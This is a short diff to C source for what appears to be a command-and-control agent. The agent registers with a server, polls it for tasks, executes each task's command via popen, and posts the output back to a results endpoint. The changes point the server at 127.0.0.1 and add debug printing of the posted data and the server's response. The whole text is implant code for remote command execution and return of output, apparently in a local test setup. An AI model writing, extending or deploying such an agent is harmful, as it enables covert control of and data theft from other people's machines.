@@ -7,7 +7,7 @@
 #include <openssl/err.h>
 #include "./reqs.h"
 
-#define SERVER "localhost"
+#define SERVER "127.0.0.1"
 #define PORT "443"
 #define REGISTER_ENDPOINT "/register"
 #define TASKS_ENDPOINT "/tasks/"
@@ -32,8 +32,11 @@ void send_result(const char *task_id, const char *output) {
     snprintf(post_data, sizeof(post_data),
              "{\"agent_id\":\"%s\",\"task_id\":\"%s\",\"output\":\"%s\"}",
              agent_id, task_id, output);
-    //printf("POSTING: %s\n", post_data);
-    https_post(SERVER, PORT, RESULTS_ENDPOINT, post_data, NULL, 0);
+    printf("POST DATA: %s\n", post_data);
+    
+    char resp[2048] = {0};
+    https_post(SERVER, PORT, RESULTS_ENDPOINT, post_data, resp, sizeof(resp));
+    printf("Server response: %s\n", resp);
 }
 
 void poll_and_execute() {
@@ -55,7 +58,6 @@ void poll_and_execute() {
                     fread(result, 1, sizeof(result) - 1, fp);
                     pclose(fp);
                 }
-                //printf("RESULT: %s\n", result);
                 send_result(task_id, result);
             }
             task = strstr(task + 1, "\"id\":\"");
